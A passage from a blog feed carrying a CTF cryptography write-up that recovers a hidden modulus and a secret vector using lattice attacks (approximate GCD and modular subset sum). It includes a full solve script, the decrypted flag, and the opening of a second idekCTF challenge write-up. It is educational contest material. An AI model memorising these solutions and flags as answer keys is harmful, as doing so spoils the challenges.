<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"A = </span><span class="si">{</span><span class="n">A_mod</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"b = </span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"t = </span><span class="si">{</span><span class="n">t</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">str</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span> <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">s</span><span class="p">]).</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">()</span>
<span class="n">iv</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">ct</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"iv = '</span><span class="si">{</span><span class="n">iv</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">'"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"ct = '</span><span class="si">{</span><span class="n">ct</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">'"</span><span class="p">)</span>
</code></pre></div></div>

<p>as well as the output in <code class="language-plaintext highlighter-rouge">output.txt</code></p>

<h5 id="source-code-analysis">Source code analysis</h5>

<p>The encryption script generates an $n \times n$ matrix $A$ and a vector $s$, then calculates:</p>

\[\large x = \sum_{i=0}^{n}a_{i} s_{i}\]

<p>for each row $a_{i}$ in $A$. The user is then given the following:</p>

\[\large \begin{align}
\nonumber A_{mod} &amp;\equiv A \mod p \\
\nonumber b &amp;\equiv x \mod p \\
\nonumber t &amp;= x &gt;&gt; 48
\end{align}\]

<p>The secret vector $s$ is concatenated, then hashed to produce the AES-CBC key which encrypts the flag.</p>

<h5 id="recovering-p">Recovering p</h5>

<p>This already almost seems like a subset sum problem, but only the most significant bits of $x$ are given. It also almost looks like a modular subset sum problem, but the modulo $p$ is not given. However, with both $b$ and $t$ given, we can set up an <code class="language-plaintext highlighter-rouge">AGCD</code> or an “Approximate Greatest Common Divisor” instance to recover the modulo $p$:</p>

\[\large \begin{align}
\nonumber b &amp;= x \mod p \\
\nonumber b &amp;= x + k \cdot p \\
\nonumber b - x &amp;= k \cdot p
\end{align}\]

<p>we are not given $x$ exactly, but $x = t \cdot 2^{48} + r$ for some lower bits remainder $r &lt; 2^{48}$. So, the AGCD instance is:</p>

\[\large b_{i} - t_{i} \cdot 2^{48} = k_{i} \cdot p + r_{i}\]

<p>We can use the orthogonal lattice AGCD implementation from https://github.com/jvdsn/crypto-attacks/blob/master/attacks/acd/ol.py to solve for $p$:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://github.com/jvdsn/crypto-attacks/blob/master/attacks/acd/ol.py
</span><span class="k">def</span> <span class="nf">AGCD</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">rho</span><span class="p">):</span>
    <span class="n">R</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">**</span> <span class="n">rho</span>

    <span class="n">B</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">xi</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">xi</span>
        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">R</span>

    <span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="n">LLL</span><span class="p">()</span>

    <span class="n">K</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="n">submatrix</span><span class="p">(</span><span class="n">row</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">col</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">nrows</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">ncols</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)).</span><span class="n">right_kernel</span><span class="p">()</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">K</span><span class="p">.</span><span class="n">an_element</span><span class="p">()</span>
    <span class="n">r0</span> <span class="o">=</span> <span class="n">symmetric_mod</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">q</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">p</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">r0</span><span class="p">)</span> <span class="o">//</span> <span class="n">q</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">r</span> <span class="o">=</span> <span class="p">[</span><span class="n">symmetric_mod</span><span class="p">(</span><span class="n">xi</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">xi</span> <span class="ow">in</span> <span class="n">x</span><span class="p">]</span>
    <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="o">-</span><span class="n">R</span> <span class="o">&lt;</span> <span class="n">ri</span> <span class="o">&lt;</span> <span class="n">R</span> <span class="k">for</span> <span class="n">ri</span> <span class="ow">in</span> <span class="n">r</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">r</span>
        
<span class="n">y</span> <span class="o">=</span> <span class="p">[(</span><span class="n">ti</span> <span class="o">&lt;&lt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">-</span> <span class="n">bi</span> <span class="k">for</span> <span class="n">ti</span><span class="p">,</span> <span class="n">bi</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">b</span><span class="p">)]</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">AGCD</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="mi">48</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</code></pre></div></div>

<h5 id="recovering-s">Recovering s</h5>

<p>With the modulus $p$ recovered, we now have a multiple modular subset sum problem:</p>

\[\large b\equiv \sum_{i=0}^{n} a_{i} s_{i} \mod p\]

<p>for each row $a$ in $A$. With $b$, $A$ and $p$, we can use MMSSP to solve for $s$:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://hackmd.io/@L4m/B1Vpr_vK0
</span><span class="k">def</span> <span class="nf">Multiple_Modular_Subset_Sum_Problem</span><span class="p">(</span><span class="n">multi</span><span class="p">,</span><span class="n">result</span><span class="p">,</span><span class="n">modul</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">multi</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">n1</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
    <span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sqrt</span><span class="p">((</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="mi">4</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">QQ</span><span class="p">,</span><span class="n">n</span><span class="p">,</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">multi</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">multi</span><span class="p">).</span><span class="n">T</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">augment</span><span class="p">(</span><span class="n">N</span><span class="o">*</span><span class="n">multi</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n1</span><span class="p">)</span> <span class="p">:</span>
        <span class="n">tmp_</span> <span class="o">=</span>  <span class="n">Matrix</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="n">_</span> <span class="o">+</span> <span class="p">[</span><span class="n">N</span><span class="o">*</span><span class="n">modul</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">n1</span><span class="o">-</span><span class="n">_</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
        <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">stack</span><span class="p">(</span><span class="n">tmp_</span><span class="p">)</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">([</span><span class="mi">1</span><span class="o">/</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="o">-</span><span class="n">N</span><span class="o">*</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">])</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">stack</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="p">:</span>
        <span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">LLL</span><span class="p">()[</span><span class="mi">0</span><span class="p">][:</span><span class="n">n</span><span class="p">]</span>
    <span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="mi">2</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">M</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">M</span>

<span class="n">sol</span> <span class="o">=</span> <span class="n">Multiple_Modular_Subset_Sum_Problem</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<p>With the secret vector $s$ recovered, decryption becomes trivial. The bits are concatenated, hashed, and then the resulting key is used for AES-CBC decryption:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">str</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span> <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">sol</span><span class="p">]).</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">()</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">ct</span><span class="p">.</span><span class="nb">hex</span><span class="p">())),</span><span class="mi">16</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
<span class="c1"># DREAM{AGCD_4nd_MvMSSP_2_m4ny_4bbr3v14t10ns_but_pl34s3_d3l3t3_GPT5_n0w}
</span></code></pre></div></div>

<h5 id="solvesage">solve.sage</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span><span class="p">,</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
<span class="kn">import</span> <span class="nn">secrets</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">,</span> <span class="n">ast</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"output.txt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">A</span>  <span class="o">=</span> <span class="n">ast</span><span class="p">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">b</span>  <span class="o">=</span> <span class="n">ast</span><span class="p">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">t</span>  <span class="o">=</span> <span class="n">ast</span><span class="p">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"'"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">ct</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"'"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">symmetric_mod</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="n">m</span> <span class="o">+</span> <span class="n">m</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span><span class="p">)</span> <span class="o">-</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span>

<span class="c1"># https://github.com/jvdsn/crypto-attacks/blob/master/attacks/acd/ol.py
</span><span class="k">def</span> <span class="nf">AGCD</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">rho</span><span class="p">):</span>
    <span class="n">R</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">**</span> <span class="n">rho</span>

    <span class="n">B</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">xi</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">xi</span>
        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">R</span>

    <span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="n">LLL</span><span class="p">()</span>

    <span class="n">K</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="n">submatrix</span><span class="p">(</span><span class="n">row</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">col</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">nrows</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">ncols</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)).</span><span class="n">right_kernel</span><span class="p">()</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">K</span><span class="p">.</span><span class="n">an_element</span><span class="p">()</span>
    <span class="n">r0</span> <span class="o">=</span> <span class="n">symmetric_mod</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">q</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">p</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">r0</span><span class="p">)</span> <span class="o">//</span> <span class="n">q</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">r</span> <span class="o">=</span> <span class="p">[</span><span class="n">symmetric_mod</span><span class="p">(</span><span class="n">xi</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">xi</span> <span class="ow">in</span> <span class="n">x</span><span class="p">]</span>
    <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="o">-</span><span class="n">R</span> <span class="o">&lt;</span> <span class="n">ri</span> <span class="o">&lt;</span> <span class="n">R</span> <span class="k">for</span> <span class="n">ri</span> <span class="ow">in</span> <span class="n">r</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">r</span>

<span class="c1"># https://hackmd.io/@L4m/B1Vpr_vK0
</span><span class="k">def</span> <span class="nf">Multiple_Modular_Subset_Sum_Problem</span><span class="p">(</span><span class="n">multi</span><span class="p">,</span><span class="n">result</span><span class="p">,</span><span class="n">modul</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">multi</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">n1</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
    <span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sqrt</span><span class="p">((</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="mi">4</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">QQ</span><span class="p">,</span><span class="n">n</span><span class="p">,</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">multi</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">multi</span><span class="p">).</span><span class="n">T</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">augment</span><span class="p">(</span><span class="n">N</span><span class="o">*</span><span class="n">multi</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n1</span><span class="p">)</span> <span class="p">:</span>
        <span class="n">tmp_</span> <span class="o">=</span>  <span class="n">Matrix</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="n">_</span> <span class="o">+</span> <span class="p">[</span><span class="n">N</span><span class="o">*</span><span class="n">modul</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">n1</span><span class="o">-</span><span class="n">_</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
        <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">stack</span><span class="p">(</span><span class="n">tmp_</span><span class="p">)</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">([</span><span class="mi">1</span><span class="o">/</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="o">-</span><span class="n">N</span><span class="o">*</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">])</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">stack</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="p">:</span>
        <span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">LLL</span><span class="p">()[</span><span class="mi">0</span><span class="p">][:</span><span class="n">n</span><span class="p">]</span>
    <span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="mi">2</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">M</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">M</span>

<span class="n">y</span> <span class="o">=</span> <span class="p">[(</span><span class="n">ti</span> <span class="o">&lt;&lt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">-</span> <span class="n">bi</span> <span class="k">for</span> <span class="n">ti</span><span class="p">,</span> <span class="n">bi</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">b</span><span class="p">)]</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Solving AGCD..."</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">AGCD</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="mi">48</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Recovered p: </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Solving MMSSP..."</span><span class="p">)</span>
<span class="n">sol</span> <span class="o">=</span> <span class="n">Multiple_Modular_Subset_Sum_Problem</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Potential solution: </span><span class="si">{</span><span class="n">sol</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">str</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span> <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">sol</span><span class="p">]).</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">()</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">ct</span><span class="p">.</span><span class="nb">hex</span><span class="p">())),</span><span class="mi">16</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
<span class="c1"># DREAM{AGCD_4nd_MvMSSP_2_m4ny_4bbr3v14t10ns_but_pl34s3_d3l3t3_GPT5_n0w}
</span></code></pre></div></div>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="AGCD" /><category term="Subset sum problem" /><summary type="html"><![CDATA[Challenge overview]]></summary></entry><entry><title type="html">Diamond Ticket (idekCTF 2025)</title><link href="https://zukane.github.io/diamond-ticket/" rel="alternate" type="text/html" title="Diamond Ticket (idekCTF 2025)" /><published>2025-08-02T12:00:00+02:00</published><updated>2025-08-02T12:00:00+02:00</updated><id>https://zukane.github.io/diamond-ticket</id><content type="html" xml:base="https://zukane.github.io/diamond-ticket/"><![CDATA[<h5 id="challenge-overview">Challenge overview</h5>

<p>In this CTF challenge we are given the following encryption script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#Some magic from Willy Wonka
</span><span class="n">p</span> <span class="o">=</span> <span class="mi">170829625398370252501980763763988409583</span>
<span class="n">a</span> <span class="o">=</span> <span class="mi">164164878498114882034745803752027154293</span>
<span class="n">b</span> <span class="o">=</span> <span class="mi">125172356708896457197207880391835698381</span>

<span class="k">def</span> <span class="nf">chocolate_generator</span><span class="p">(</span><span class="n">m</span><span class="p">:</span><span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="k">return</span> <span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="nb">pow</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">p</span><span class="p">))</span> <span class="o">%</span> <span class="n">p</span>

<span class="c1">#The diamond ticket is hiding inside chocolate
</span><span class="n">diamond_ticket</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">diamond_ticket</span><span class="p">)</span> <span class="o">==</span> <span class="mi">26</span>
<span class="k">assert</span> <span class="n">diamond_ticket</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s">"idek{"</span>
<span class="k">assert</span> <span class="n">diamond_ticket</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">:]</span> <span class="o">==</span> <span class="sa">b</span><span class="s">"}"</span>
